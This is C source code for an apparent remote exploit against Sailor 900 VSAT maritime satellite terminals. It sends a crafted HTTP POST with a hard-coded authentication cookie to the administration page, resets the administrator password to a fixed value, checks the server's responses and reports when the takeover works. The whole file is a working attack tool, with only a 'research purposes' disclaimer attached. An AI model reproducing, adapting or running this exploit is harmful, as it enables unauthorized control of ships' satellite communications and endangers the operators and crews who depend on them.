 /*
  ** File : satcompwn.c - [VSAT SAILOR SAT COM 900 Remote 0day]
  ** Author : Nicholas Lemonias
  **
  ** This is proprietary source code material of Advanced Information Security Corporation.
  ** Usage, distribution and modifications are pursuant to our terms of agreement.  
  ** 
  **
  ** Copyright (c) 2009-2014, Advanced Information Security Corporation as represented by the
  ** author of this software.
  ** All rights reserved.
  **
  **
  ** This research demo is for academic research purposes ONLY. You may only use this software for 
  ** educational purposes, or for the purpose of academic research. 
  ** This work is copyright protected. You may not, copy, or distribute
  ** or use this in any other way, without prior authorisation. This work is covered by DMCA and
  ** other applicable intellectual property laws. 
  **
  **   #@#@~  VSAT SAILOR 900 / SATCOM  (iDirect/Linux)
  **   
  **   Poc Tested on our: iDirect Infiniti VMU/SATCOM v.1.47 Build 9
  **   Platform Frequency: Ku/Ka band
  **   Compatible Networks: Jabiru, Inmarsat GX, and Intelsat's Epic
  **     
  */
  
  /****************************************************************************************
   (c) 2014 Advanced Information Security Corporation
  *****************************************************************************************/
  
  
   /*    
   ** Compilation: cc satcompwn.c -o satcompwn
   ** HOW-TO:
   **        
   ** Usage: ./satcompwn <host> <port>\n
   **
   **
    */


#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <time.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/socket.h>

#define BUFFER_MAX_SIZE 65535
#define BUFFER_MIN_LEN  230

ssize_t payload(int sock, char *hst, char *pg, char *pss)
{
    char BUF_SIZE_S[BUFFER_MAX_SIZE + 1], BUF_SIZE_R[BUFFER_MAX_SIZE + 1];
    ssize_t n; char *l;

    snprintf(BUF_SIZE_S, BUFFER_MIN_LEN,
             "POST %s HTTP/1.0\n\n"
             "Host: %s\r\n"
             "Content-type: application/x-www-form-urlencoded\r\n"
             "Content-length: %zu \r\n"
             "Cookie: tt_adm=694020\r\n"
             "%s \r\n\n", pg, hst, strlen(pss), pss);

   if(write(sock,BUF_SIZE_S, strlen(BUF_SIZE_S)) == -1) {
            error("Read error");
            return -1;
}
    printf("\n");
    printf("Sending Payload.....\n");

    printf("\n\n");
    printf("%s", BUF_SIZE_S, sizeof(BUF_SIZE_S));


  while ((n =read(sock,BUF_SIZE_R,sizeof(BUF_SIZE_R))) > 0){
        BUF_SIZE_R[n] = '\0';

         if(n == -1) {
            error("Read error");
            return -1;
}



   if ( strstr(BUF_SIZE_R, "404")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.5 - False Positive HTTP ERROR [404] Host is not a V-SAT Sailor 900 terminal.\n\n\n");
   if ( strstr(BUF_SIZE_R, "401")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.2 - HTTP Unauthorized [401] Unauthorized Access to remote host.\n\n\n");
   if ( strstr(BUF_SIZE_R, "500")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.5.1 - HTTP Internal Server Error [500] Internal Server Error - The remote host couldn't recognise the request. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( strstr(BUF_SIZE_R, "303")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.3.4 - HTTP See Other [303] Possible Redirect - The code received says it is temporary under a different URL. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( strstr(BUF_SIZE_R, "307")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.3.8 - HTTP Temporary Redirect [307] Possible Redirect - The requested resource received indicates redirection. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( strstr(BUF_SIZE_R, "403")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.4 - HTTP Forbidden [403] The remote server/ understood the request, but is refusing to fulfill it.\n\n\n");
   if ( strstr(BUF_SIZE_R, "407")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.8 - HTTP Proxy Authentication Required [407] - The remote terminal requires HTTP authentication. If this is a valid SAILOR 900 terminal, it is protected with HTTP authentication.\n\n\n");
   if ( strstr(BUF_SIZE_R, "408")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.4.9 - HTTP Request Time out [408] - The client did not produce a request within the time that the server was prepared to wait.\n\n\n");
   if ( strstr(BUF_SIZE_R, "503")) printf("\n\n[x] Exploit Failed Ref. RFC 2616, 10.5.4 - HTTP Service Unavailable [503] - Connection Refused. The hostname of the terminal provided is currently unable to handle the request.\n\n\n");
   if ( strstr(BUF_SIZE_R, "411")) printf("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 411 - Length Required. This is not a valid SAILOR 900 terminal.\n\n\n");
   if ( strstr(BUF_SIZE_R, "400")) printf("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 400 - Bad Request. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\n\n\n");
   if ( strstr(BUF_SIZE_R, "301")) printf("\n\n[x] Exploit Failed Ref. RFC 2616 - Error 301 - Moved Permanently. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\n\n\n");
   if ( strstr(BUF_SIZE_R, "BAD REQUEST")) printf("\n\n[x] Exploit Failed. This is not a valid SAILOR 900 terminal.\n\n\n");

   if ( strstr(BUF_SIZE_R, "202")) {

  while ( (l=strstr(BUF_SIZE_R,"Thrane & Thrane")) == NULL ) printf("\n\n[x] Exploit Failed. This is not a valid SAILOR 900 terminal...\n\n\n"); }

  else if (strstr(BUF_SIZE_R, "Thrane & Thrane") != NULL && strstr(BUF_SIZE_R, "302") == NULL){
   printf("[x] Mission Successful  Ref. RFC 2616, 10.2.3 - HTTP Okay  [202] The remote host is a V-SAT Sailor 900. Please Login as administrator: user:admin & pass:aisatpwn2134 on %s\n\n\n", hst);
  }
}
 printf("***********************************************************************\n");
 printf("*Advanced Information Security Corporation, 2014 - All Rights Reserved*\n");
 printf("***********************************************************************\n");
 printf("* Please wait.. I will provide you with some more information below:\n");                                                                  
 printf("***********************************************************************\n");
 printf("\n\n\n\n");
 printf("%s \n\n", BUF_SIZE_R, sizeof(BUF_SIZE_R));

  return n;

}

int main (int argc, char *argv[]) {


   char *pg  = "/index.lua?pageID=administration";
   char *pss = "&usernameAdmChange=admin"
               "&passwordAdmChange=aisatpwn2134";

   // char *cval = "tt_adm=tt_adm=694020";

   long arg;
   int sock, opt, evalopt, s;


if(argc < 2)
{
      printf("***********************************************************************\n");
      printf("(Advanced Information Security Corporation, 2014 - All Rights Reserved*\n");
      printf("***********************************************************************\n");
      printf("*                                                                     *\n");
      printf("*                (V-SAT SAILOR 900 Remote Exploit)                    *\n");
      printf("***********************************************************************\n");
      printf("* Disclaimer: This is proprietary source code material of Advanced    *\n");
      printf("* Information Security Corporation. This software is for              *\n");
      printf("* research purposes only.                                             *\n");
      printf("***********************************************************************\n");
      printf("*    VSAT Sailor 900 / Tested on iDirect Infiniti VMU v.1.47 Build 9  *\n");
      printf("* Description:                                                        *\n");
      printf("* The Sailor 900 VSAT is an advanced maritime stabilised Ku/Ka band   *\n");
      printf("* platform with integrated GPS, compatible with a number of satellite *\n");
      printf("* networks, such as Jabiru, Inmarsat GX, and Intelsat's Epic.         *\n");
      printf("***********************************************************************\n");
      printf("\n\n");
      fprintf(stderr, " Main Menu \n");
      fprintf(stderr, " Usage: %s <host> <port>\n", argv[0]);
      exit(1);
}
   struct timeval tv;
   struct sockaddr_in remote;
   struct hostent *host;
   socklen_t lon;


   host = gethostbyname((void *)argv[1]);

   fd_set wset;
   fd_set rset;

  sock = socket(AF_INET,SOCK_STREAM,0);
  remote.sin_port = htons(atoi(argv[2]));
  remote.sin_addr.s_addr =  htonl(INADDR_ANY);
  remote.sin_addr.s_addr = ((struct in_addr *)(host->h_addr))->s_addr;
  remote.sin_family = AF_INET;
  memset(remote.sin_zero,0,sizeof(remote.sin_zero));
  fflush(stdout);


  if (sock == -1) {
    perror("socket creation error");
   return -1;
  }
  FD_ZERO( &wset );
  FD_SET( sock , &wset );

  FD_ZERO( &rset );
  FD_SET( sock , &rset );

  tv.tv_sec  = 3;
  tv.tv_usec = 0;


 s = connect(sock,(struct sockaddr *)&remote,sizeof(struct sockaddr));
 if (s == -1 ) {
    perror("connection ");
   return -1;}

  if( errno != 0) {
    perror("connection ");
   return -1;
  }

   arg = fcntl(sock, F_GETFL, NULL);
   arg |= O_NONBLOCK;
   fcntl(sock, F_SETFL, arg);
  if( fcntl( sock , F_SETFL , O_NONBLOCK ) == -1 ) {
    perror("fcntl error");
   return -1;
  }

  opt = select(sock+1,NULL,&wset,NULL,&tv);

  if( opt == -1 ) {
    perror("select");
   return -1;
  }
  if (opt > 0) {
  lon = sizeof(int);
  getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&evalopt), &lon);

 if (evalopt) {
              fprintf(stderr, "Socket Connection Error Code at: %d - %s\n", evalopt, strerror(evalopt));
              exit(0);
           }


if( fcntl( sock , F_SETFL , 0 ) == -1 ) {
    perror("fcntl");
    printf("[RST-FCNTL] FCNTL Error. Exiting the software.\n\n");
   return -1;
}


if( payload(sock,host->h_name,pg,pss) != 1) printf("\n\n[x] Payload Sent. Please check server responses above to verify status.\n\n");


  arg = fcntl(sock, F_GETFL, NULL);
  arg &= (~O_NONBLOCK);
  fcntl(sock, F_SETFL, arg);

        close(sock);
        exit(1);
 }

}